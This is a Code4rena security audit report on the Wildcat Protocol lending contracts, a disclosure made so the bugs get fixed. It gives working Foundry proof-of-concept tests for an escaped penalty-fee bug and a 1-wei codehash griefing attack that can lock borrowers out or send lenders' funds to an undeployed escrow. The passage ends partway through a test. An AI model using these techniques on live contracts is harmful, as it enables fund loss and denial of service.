---
sponsor: "Wildcat Protocol"
slug: "2023-10-wildcat"
date: "2023-12-11"
title: "The Wildcat Protocol"
findings: "https://github.com/code-423n4/2023-10-wildcat-findings/issues"
contest: 296
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of The Wildcat Protocol smart contract system written in Solidity. The audit took place between October 16 - October 26, 2023.

## Wardens

144 Wardens contributed reports to The Wildcat Protocol:

  1. [0xCiphky](https://code4rena.com/@0xCiphky)
  2. [MiloTruck](https://code4rena.com/@MiloTruck)
  3. [hash](https://code4rena.com/@hash)
  4. [Robert](https://code4rena.com/@Robert)
  5. [Toshii](https://code4rena.com/@Toshii)
  6. [caventa](https://code4rena.com/@caventa)
  7. [Yanchuan](https://code4rena.com/@Yanchuan)
  8. [yumsec](https://code4rena.com/@yumsec)
  9. [ZdravkoHr](https://code4rena.com/@ZdravkoHr)
  10. [josephdara](https://code4rena.com/@josephdara)
  11. [0xDING99YA](https://code4rena.com/@0xDING99YA)
  12. [osmanozdemir1](https://code4rena.com/@osmanozdemir1)
  13. [rvierdiiev](https://code4rena.com/@rvierdiiev)
  14. [InAllHonesty](https://code4rena.com/@InAllHonesty)
  15. [rahul](https://code4rena.com/@rahul)
  16. [nonseodion](https://code4rena.com/@nonseodion)
  17. [T1MOH](https://code4rena.com/@T1MOH)
  18. [nisedo](https://code4rena.com/@nisedo)
  19. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  20. [ggg\_ttt\_hhh](https://code4rena.com/@ggg_ttt_hhh)
  21. [QiuhaoLi](https://code4rena.com/@QiuhaoLi)
  22. [0xSmartContract](https://code4rena.com/@0xSmartContract)
  23. [catellatech](https://code4rena.com/@catellatech)
  24. [deth](https://code4rena.com/@deth)
  25. [deepkin](https://code4rena.com/@deepkin)
  26. [JCK](https://code4rena.com/@JCK)
  27. [TrungOre](https://code4rena.com/@TrungOre)
  28. [J4X](https://code4rena.com/@J4X)
  29. [0xbepresent](https://code4rena.com/@0xbepresent)
  30. [Aymen0909](https://code4rena.com/@Aymen0909)
  31. [0xStalin](https://code4rena.com/@0xStalin)
  32. [t0x1c](https://code4rena.com/@t0x1c)
  33. [LokiThe5th](https://code4rena.com/@LokiThe5th)
  34. [Madalad](https://code4rena.com/@Madalad)
  35. [YusSecurity](https://code4rena.com/@YusSecurity) ([flacko](https://code4rena.com/@flacko) and [marchev](https://code4rena.com/@marchev))
  36. [GREY-HAWK-REACH](https://code4rena.com/@GREY-HAWK-REACH) ([Kose](https://code4rena.com/@Kose), [dimulski](https://code4rena.com/@dimulski), [aslanbek](https://code4rena.com/@aslanbek) and [Habib0x](https://code4rena.com/@Habib0x))
  37. [devival](https://code4rena.com/@devival)
  38. [DarkTower](https://code4rena.com/@DarkTower) ([Gelato_ST](https://code4rena.com/@Gelato_ST), [Maroutis](https://code4rena.com/@Maroutis), [OxTenma](https://code4rena.com/@OxTenma) and [0xrex](https://code4rena.com/@0xrex))
  39. [ast3ros](https://code4rena.com/@ast3ros)
  40. [radev\_sw](https://code4rena.com/@radev_sw)
  41. [joaovwfreire](https://code4rena.com/@joaovwfreire)
  42. [elprofesor](https://code4rena.com/@elprofesor)
  43. [3docSec](https://code4rena.com/@3docSec)
  44. [CaeraDenoir](https://code4rena.com/@CaeraDenoir)
  45. [trachev](https://code4rena.com/@trachev)
  46. [serial-coder](https://code4rena.com/@serial-coder)
  47. [VAD37](https://code4rena.com/@VAD37)
  48. [HChang26](https://code4rena.com/@HChang26)
  49. [Infect3d](https://code4rena.com/@Infect3d)
  50. [crunch](https://code4rena.com/@crunch)
  51. [circlelooper](https://code4rena.com/@circlelooper)
  52. [Jiamin](https://code4rena.com/@Jiamin)
  53. [Juntao](https://code4rena.com/@Juntao)
  54. [nirlin](https://code4rena.com/@nirlin)
  55. [Sathish9098](https://code4rena.com/@Sathish9098)
  56. [invitedtea](https://code4rena.com/@invitedtea)
  57. [Raihan](https://code4rena.com/@Raihan)
  58. [petrichor](https://code4rena.com/@petrichor)
  59. [0xAnah](https://code4rena.com/@0xAnah)
  60. [shamsulhaq123](https://code4rena.com/@shamsulhaq123)
  61. [0xhex](https://code4rena.com/@0xhex)
  62. [SAQ](https://code4rena.com/@SAQ)
  63. [0xta](https://code4rena.com/@0xta)
  64. [0xVolcano](https://code4rena.com/@0xVolcano)
  65. [cu5t0mpeo](https://code4rena.com/@cu5t0mpeo)
  66. [nobody2018](https://code4rena.com/@nobody2018)
  67. [gizzy](https://code4rena.com/@gizzy)
  68. [Eigenvectors](https://code4rena.com/@Eigenvectors) ([Cosine](https://code4rena.com/@Cosine) and [timo](https://code4rena.com/@timo))
  69. [SandNallani](https://code4rena.com/@SandNallani)
  70. [Fulum](https://code4rena.com/@Fulum)
  71. [jasonxiale](https://code4rena.com/@jasonxiale)
  72. [SovaSlava](https://code4rena.com/@SovaSlava)
  73. [kodyvim](https://code4rena.com/@kodyvim)
  74. [xeros](https://code4rena.com/@xeros)
  75. [DeFiHackLabs](https://code4rena.com/@DeFiHackLabs) ([AkshaySrivastav](https://code4rena.com/@AkshaySrivastav), [Cache\_and\_Burn](https://code4rena.com/@Cache_and_Burn), [IceBear](https://code4rena.com/@IceBear), [Ronin](https://code4rena.com/@Ronin), [Sm4rty](https://code4rena.com/@Sm4rty), [SunSec](https://code4rena.com/@SunSec), [sashik\_eth](https://code4rena.com/@sashik_eth), [zuhaibmohd](https://code4rena.com/@zuhaibmohd) and [ret2basic](https://code4rena.com/@ret2basic))
  76. [0xComfyCat](https://code4rena.com/@0xComfyCat)
  77. [stackachu](https://code4rena.com/@stackachu)
  78. [smiling\_heretic](https://code4rena.com/@smiling_heretic)
  79. [Tricko](https://code4rena.com/@Tricko)
  80. [0xbrett8571](https://code4rena.com/@0xbrett8571)
  81. [b0g0](https://code4rena.com/@b0g0)
  82. [marqymarq10](https://code4rena.com/@marqymarq10)
  83. [ayden](https://code4rena.com/@ayden)
  84. [ke1caM](https://code4rena.com/@ke1caM)
  85. [Drynooo](https://code4rena.com/@Drynooo)
  86. [Mike\_Bello90](https://code4rena.com/@Mike_Bello90)
  87. [inzinko](https://code4rena.com/@inzinko)
  88. [Phantom](https://code4rena.com/@Phantom)
  89. [Udsen](https://code4rena.com/@Udsen)
  90. [karanctf](https://code4rena.com/@karanctf)
  91. [DavidGiladi](https://code4rena.com/@DavidGiladi)
  92. [josieg\_74497](https://code4rena.com/@josieg_74497)
  93. [0x3b](https://code4rena.com/@0x3b)
  94. [SHA\_256](https://code4rena.com/@SHA_256)
  95. [MatricksDeCoder](https://code4rena.com/@MatricksDeCoder)
  96. [Vagner](https://code4rena.com/@Vagner)
  97. [tallo](https://code4rena.com/@tallo)
  98. [cartlex\_](https://code4rena.com/@cartlex_)
  99. [sl1](https://code4rena.com/@sl1)
  100. [Silvermist](https://code4rena.com/@Silvermist)
  101. [max10afternoon](https://code4rena.com/@max10afternoon)
  102. [d3e4](https://code4rena.com/@d3e4)
  103. [0xKbl](https://code4rena.com/@0xKbl)
  104. [AS](https://code4rena.com/@AS)
  105. [KeyKiril](https://code4rena.com/@KeyKiril)
  106. [0xSwahili](https://code4rena.com/@0xSwahili)
  107. [bdmcbri](https://code4rena.com/@bdmcbri)
  108. [0xAsen](https://code4rena.com/@0xAsen)
  109. [0xpiken](https://code4rena.com/@0xpiken)
  110. [gumgumzum](https://code4rena.com/@gumgumzum)
  111. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  112. [HALITUS](https://code4rena.com/@HALITUS)
  113. [0xkazim](https://code4rena.com/@0xkazim)
  114. [TuringConsulting](https://code4rena.com/@TuringConsulting) ([0xadrii](https://code4rena.com/@0xadrii), [JosepBove](https://code4rena.com/@JosepBove) and [Saintcode\_](https://code4rena.com/@Saintcode_))
  115. [erictee](https://code4rena.com/@erictee)
  116. [\_nd\_koo](https://code4rena.com/@_nd_koo)
  117. [0xhegel](https://code4rena.com/@0xhegel)
  118. [said](https://code4rena.com/@said)
  119. [lanrebayode77](https://code4rena.com/@lanrebayode77)
  120. [almurhasan](https://code4rena.com/@almurhasan)
  121. [peter](https://code4rena.com/@peter)
  122. [audityourcontracts](https://code4rena.com/@audityourcontracts)
  123. [AM](https://code4rena.com/@AM) ([StefanAndrei](https://code4rena.com/@StefanAndrei) and [0xmatei](https://code4rena.com/@0xmatei))
  124. [squeaky\_cactus](https://code4rena.com/@squeaky_cactus)
  125. [zaevlad](https://code4rena.com/@zaevlad)

This audit was judged by [0xTheC0der](https://code4rena.com/@0xTheC0der).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 16 unique vulnerabilities. Of these vulnerabilities, 6 received a risk rating in the category of HIGH severity and 10 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 42 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 11 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 The Wildcat Protocol repository](https://github.com/code-423n4/2023-10-wildcat), and is composed of 22 smart contracts written in the Solidity programming language and includes 2332 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **henry**, from warden hihen, generated the [Automated Findings report](https://gist.github.com/code423n4/265e1707379b9a3f89cf18aa0bffcb7c) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (6)
## [[H-01] Borrowers can escape from paying half of the penalty fees by closing the market, and those remaining penalty fees will be covered by the lender who withdraws last](https://github.com/code-423n4/2023-10-wildcat-findings/issues/506)
*Submitted by [osmanozdemir1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/506), also found by [Aymen0909](https://github.com/code-423n4/2023-10-wildcat-findings/issues/602), [0xbepresent](https://github.com/code-423n4/2023-10-wildcat-findings/issues/592), [QiuhaoLi](https://github.com/code-423n4/2023-10-wildcat-findings/issues/459), [nonseodion](https://github.com/code-423n4/2023-10-wildcat-findings/issues/451), [hash](https://github.com/code-423n4/2023-10-wildcat-findings/issues/428), 0xCiphky ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/396), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/170)), [TrungOre](https://github.com/code-423n4/2023-10-wildcat-findings/issues/355), [ggg\_ttt\_hhh](https://github.com/code-423n4/2023-10-wildcat-findings/issues/211), [rvierdiiev](https://github.com/code-423n4/2023-10-wildcat-findings/issues/128), and [InAllHonesty](https://github.com/code-423n4/2023-10-wildcat-findings/issues/100)*

### Lines of code

<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/libraries/FeeMath.sol#L168-L172>

### Vulnerability details

To explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.

Lenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.

The important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment. Every market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.

The most crucial part starts now. The penalty fee does not become `0` immediately after the delinquency is cured. The penalty fee is still being applied, even after the delinquency is cured, until the grace tracker counts down to zero.

An example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid."*

[Here](<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/libraries/FeeMath.sol#L89>), you can find the code snippet of penalty fee calculation.

Now, let's check how to close a market. Here is the `closeMarket()` function:

```solidity
file: WildcatMarket.sol
142.  function closeMarket() external onlyController nonReentrant {
143.    MarketState memory state = _getUpdatedState();
144.    state.annualInterestBips = 0;
145.    state.isClosed = true;
146.    state.reserveRatioBips = 0;
147.    if (_withdrawalData.unpaidBatches.length() > 0) {
148.      revert CloseMarketWithUnpaidWithdrawals();
149.    }
150.    uint256 currentlyHeld = totalAssets();
151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining "state.timeDelinquent" to pay penalty fees. 
152.    if (currentlyHeld < totalDebts) {
153.      // Transfer remaining debts from borrower
154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt
155.    } else if (currentlyHeld > totalDebts) {
156.      // Transfer excess assets to borrower
157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);
158.    }
159.    _writeState(state);
160.    emit MarketClosed(block.timestamp);
161.  }
```

<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarket.sol#L142C1-L161C4>

While closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.

If the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.

The borrower didn't pay the remaining penalties when closing the market, but who will pay it?

- Lenders will keep earning those penalty fees (*the base rate will be `0` after closing, but the penalty fee will still accumulate*)
- Lenders will start withdrawing their funds.
- All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.
- The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.

The borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.

1.  The borrower had a cash flow problem after taking the debt.
2.  The market stayed delinquent for a long time.
3.  The borrower found some funds.
4.  The borrower wanted to close the high-interest debts right after finding some funds.
5.  Immediately paid everything and closed the market while the market was still delinquent.
6.  From the borrower's perspective, they paid all of their debt while closing the market.
7.  But in reality, the borrower only paid half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower.

The protocol does not check if there are remaining penalties and doesn't charge the borrower enough while closing the market.

I provided a coded PoC below that shows every step of the vulnerability.

### Impact

- The borrower will pay only half of the penalty while closing the market.
- The other half of the penalty will keep accumulating.
- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.

Borrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (they know they won't pay the half of it). Or the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They "unintentionally" do not pay the penalty, but the lender will have to cover it.

### Coded PoC

You can use the protocol's own test setup to prove this issue:

- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.
- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`

```solidity
// @audit Not pay the half, leave it to the last lender
  function test_closeMarket_withoutPaying_HalfofThePenalty() external {
    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------
    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------

    // Alice and Bob deposit 50k each, borrower borrows 80% 
    _authorizeLender(bob);
    vm.prank(alice);
    market.depositUpTo(50_000e18);
    vm.prank(bob);
    market.depositUpTo(50_000e18);
    vm.prank(borrower);
    market.borrow(80_000e18);
    
    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.
    vm.prank(alice);
    market.queueWithdrawal(10_000e18);
    vm.prank(bob);
    market.queueWithdrawal(10_000e18);
    // skip withdrawal batch duration
    skip(1 days);
    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry. I hardoced it to make it shorter but it can also be found with _witdrawalData
    market.executeWithdrawal(bob, 86401);

    // Update the state. Market must be delinquent.
    market.updateState();
    MarketState memory state = market.previousState();
    assertTrue(state.isDelinquent);

    //----------------------------------------------CHAPTER TWO - ACTION------------------------------------------------------------------------------
    //----------------------------------CLOSE THE MARKET IMMEDIATELY AFTER PAYING DEBT----------------------------------------------------------------
    // Fast forward the time while delinquent to see the effect of delinquency penalty fees.
    skip(30 days);

    // Give some funds to the borrower to pay the debt while closing.
    asset.mint(address(borrower), 100_000e18);
    _approve(borrower, address(market), type(uint256).max);

    // We will close the market now. Save current state parameters just before closing.
    market.updateState();
    state = market.previousState();
    uint256 normalizedBalanceOfAliceBeforeClosing = state.normalizeAmount(market.scaledBalanceOf(alice));
    uint256 normalizedBalanceOfBobBeforeClosing = state.normalizeAmount(market.scaledBalanceOf(bob));

    uint256 totalDebtBeforeClosing = state.totalDebts();
    uint256 scaleFactorBeforeClosing = state.scaleFactor;
    console2.log("debt before closing: ", totalDebtBeforeClosing);
    console2.log("scale factor before closing: ", scaleFactorBeforeClosing);

    // Total debt before closing == normalized balance of Alice and Bob + unclaimed rewards + protocol fees.
    assertEq(totalDebtBeforeClosing, normalizedBalanceOfAliceBeforeClosing + normalizedBalanceOfBobBeforeClosing + state.normalizedUnclaimedWithdrawals + state.accruedProtocolFees);

    // Close the market.   
    vm.prank(address(controller));
    market.closeMarket();
    // Total asset in the market must be equal to the total debts. All debts are covered (ACCORDING TO CURRENT DEBT)
    assertEq(state.totalDebts(), market.totalAssets());

    //-----------------------------------------------CHAPTER THREE - SHOW IT-------------------------------------------------------------------------------
    //---------------------------------DEBT WILL KEEP ACCUMULATING BECAUSE OF THE REMAINING PENALTY FEES--------------------------------------------------
    // Fast forward 30 more days. 
    // Annual interest rate is updated to 0 when closing the market, but penalty fee keeps accumulating until the "state.timeDelinquent" goes toward 0.
    skip(30 days);

    // Update the state.
    market.updateState();
    state = market.previousState();
    uint256 totalDebtAfterClosing = state.totalDebts();
    uint256 scaleFactorAfterClosing = state.scaleFactor;

    // Debt and scale factor kept accumulating. Total debt is higher than the paid amount by borrower.
    assertGt(totalDebtAfterClosing, totalDebtBeforeClosing);
    assertGt(scaleFactorAfterClosing, scaleFactorBeforeClosing);
    console2.log("debt after closing: ", totalDebtAfterClosing);
    console2.log("scale factor after closing: ", scaleFactorAfterClosing);

    // Who will pay this difference in debt? --> The last lender to withdraw from the market will cover it.
    // Previous lenders except the last one will keep earning those penalty fees, but the last one will have to pay those funds.

    // Alice withdraws all of her balance.
    uint256 normalizedBalanceOfAliceAfterClosing = state.normalizeAmount(market.scaledBalanceOf(alice));
    vm.prank(alice);
    market.queueWithdrawal(normalizedBalanceOfAliceAfterClosing);
    // withdrawal batch duration
    skip(1 days);
    market.executeWithdrawal(alice, 5356801); // 5356801 is the emitted batch expiry. I hardoced it to make it shorter but it can also be found with _witdrawalData

    // After Alice's withdrawal, there won't be enough balance in the market to fully cover Bob.
    // Bob had to pay the penalty fee that the borrower didn't pay
    uint256 normalizedBalanceOfBobAfterClosing = state.normalizeAmount(market.scaledBalanceOf(bob));
    assertGt(normalizedBalanceOfBobAfterClosing, market.totalAssets());
    console2.log("total assets left: ", market.totalAssets());
    console2.log("normalized amount bob should get: ", normalizedBalanceOfBobAfterClosing);
  }
```

Below, you can find the test results:

```solidity
Running 1 test for test/market/WildcatMarket.t.sol:WildcatMarketTest
[PASS] test_closeMarket_withoutPaying_HalfofThePenalty() (gas: 714390)
Logs:
  debt before closing:  81427089816031080808713
  scale factor before closing:  1016988862478541592821945607
  debt after closing:  82095794821496423225911
  scale factor after closing:  1025347675046858373036920502
  total assets left:  40413182814156745887236
  normalized amount bob should get:  41013907001874334921477

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.41ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Tools Used

Foundry

### Recommended Mitigation Steps

I think there might be two different solutions: the easier one and the other.

The easy solution is just not to allow the borrower to close the market until all the penalty fees are accumulated. This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.

That one is simple, but I don't think it is fair for the borrower, as they will have to pay the base rate as well, for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.

That's why I think closing the market can still be allowed, even if there are penalties to accumulate. However, the problem is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.

Therefore, I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.

### Assessed type

Context

**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/506#issuecomment-1803365888):**
 > We decided to permit borrowers to close markets if delinquent and just zero out `state.timeDelinquent`, returning everything outstanding at that moment and ending things there. It's preferable from the POV of the lender to just be able to access their notional and interest ASAP, rather than wait for the timer to run back down to within the grace period. There's no alternative 'good' solution to this that isn't particularly fiddly given the way in which interest compounds.
> 
> The suggested solution would require that people waited until the market was out of delinquency before the scale factor caught up when only the penalty rate applied, so they could redeem for the extra amount due to them: this could be a *long* time if the situation leading up to a market closure after going delinquent is a protracted one.
> 
> Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/292ebda50008062dac0c5acbffe45639143fadd1).

**[laurenceday (Wildcat) confirmed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/506#issuecomment-1810757994)**

***

## [[H-02] `codehash` check in factory contracts does not account for non-empty addresses](https://github.com/code-423n4/2023-10-wildcat-findings/issues/491)
*Submitted by [MiloTruck](https://github.com/code-423n4/2023-10-wildcat-findings/issues/491), also found by Robert ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/652), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/650), [3](https://github.com/code-423n4/2023-10-wildcat-findings/issues/648)) and [0xDING99YA](https://github.com/code-423n4/2023-10-wildcat-findings/issues/531)*

In `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.

The function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:

[WildcatMarketControllerFactory.sol#L287-L296](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L287-L296)

```solidity
    // Salt is borrower address
    bytes32 salt = bytes32(uint256(uint160(msg.sender)));
    controller = LibStoredInitCode.calculateCreate2Address(
      ownCreate2Prefix,
      salt,
      controllerInitCodeHash
    );
    if (controller.codehash != bytes32(0)) { // auditor: This check
      revert ControllerAlreadyDeployed();
    }
```

This same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:

[WildcatMarketController.sol#L349-L353](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L349-L353)

```solidity
    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);
    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);
    if (market.codehash != bytes32(0)) {
      revert MarketAlreadyDeployed();
    }
```

This check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:

[WildcatSanctionsSentinel.sol#L104-L106](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L104-L106)

```solidity
    escrowContract = getEscrowAddress(borrower, account, asset);

    if (escrowContract.codehash != bytes32(0)) return escrowContract;
```

However, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code. According to [EIP-1052](https://eips.ethereum.org/EIPS/eip-1052), addresses without code only return a `0x0` codehash when they are **empty**:

> In case the account does not exist or is empty (as defined by [EIP-161](https://eips.ethereum.org/EIPS/eip-161)) `0` is pushed to the stack.
>
> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.

As seen from above, addresses without code can also return `keccak256("")` as its `codehash` if it is non-empty. [EIP-161](https://eips.ethereum.org/EIPS/eip-161) states that an address must have a zero ETH balance for it to be empty:

> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.

As such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256("")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.

Since all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:

- For controller deployments:
  - Attacker calls [`computeControllerAddress()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L342-L347) to compute the controller address for a borrower.
  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.
  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.

- For market deployments:
  - Attacker calls [`computeMarketAddress()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L221-L228) with arguments such that the deployment salt is the same.
  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.
  - When `deployMarket()` is called by the borrower, the function reverts.

- For escrow deployments:
  - Attacker calls [`getEscrowAddress()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L61-L85) with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.
  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.
  - When either [`nukeFromOrbit()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L74-L81) or [`executeWithdrawal()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L123-L188) is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.
  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.

Note that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since they can never deploy a market controller for themselves.

### Impact

An attacker can do the following at the cost of 1 wei and some gas:

- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for their address.
- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.
- Cause a sanctioned lender to lose all their funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for their address.

### Proof of Concept

The code below contains three tests:

- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.
- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.
- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if they get blocked, causing their market tokens to be unrecoverable.

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatSanctionsSentinel.sol';
import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';
import 'src/interfaces/IWildcatMarketControllerEventsAndErrors.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract CodeHashTest is Test, IWildcatMarketControllerEventsAndErrors {
    // Wildcat contracts
    address MOCK_CHAINALYSIS_ADDRESS = address(0x1337);
    WildcatSanctionsSentinel sentinel;
    WildcatArchController archController;
    WildcatMarketControllerFactory controllerFactory;
    
    // Test contracts
    MockERC20 asset;

    // Users
    address AIKEN;
    address DUEET;

    function setUp() external {
        // Deploy Wildcat contracts
        archController = new WildcatArchController();
        sentinel = new WildcatSanctionsSentinel(address(archController), MOCK_CHAINALYSIS_ADDRESS);
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
            minimumReserveRatioBips: MinimumReserveRatioBips,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: MinimumDelinquencyFeeBips,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: MaximumAnnualInterestBips
        });
        controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(sentinel),
            constraints
        );

        // Register controllerFactory in archController
        archController.registerControllerFactory(address(controllerFactory));

        // Deploy asset token
        asset = new MockERC20();

        // Setup Aiken and register him as borrower
        AIKEN = makeAddr("AIKEN");
        archController.registerBorrower(AIKEN);

        // Setup Dueet and give him some asset token
        DUEET = makeAddr("DUEET");
        asset.mint(DUEET, 1000e18);
    }

    function test_CanDOSControllerDeployment() public {
        // Dueet front-runs Aiken and transfers 1 wei to Aiken's controller address
        address controllerAddress = controllerFactory.computeControllerAddress(AIKEN);
        payable(controllerAddress).transfer(1);

        // Codehash of Aiken's controller address is now keccak256("")
        assertEq(controllerAddress.codehash, keccak256(""));

        // Aiken calls deployController(), but it reverts due to non-zero codehash
        vm.prank(AIKEN);
        vm.expectRevert(WildcatMarketControllerFactory.ControllerAlreadyDeployed.selector);
        controllerFactory.deployController();
    }

    function test_CanDOSMarketDeployment() public {
        // Deploy WildcatMarketController for Aiken
        (WildcatMarketController controller, ) = _deployControllerAndMarket(
            AIKEN,
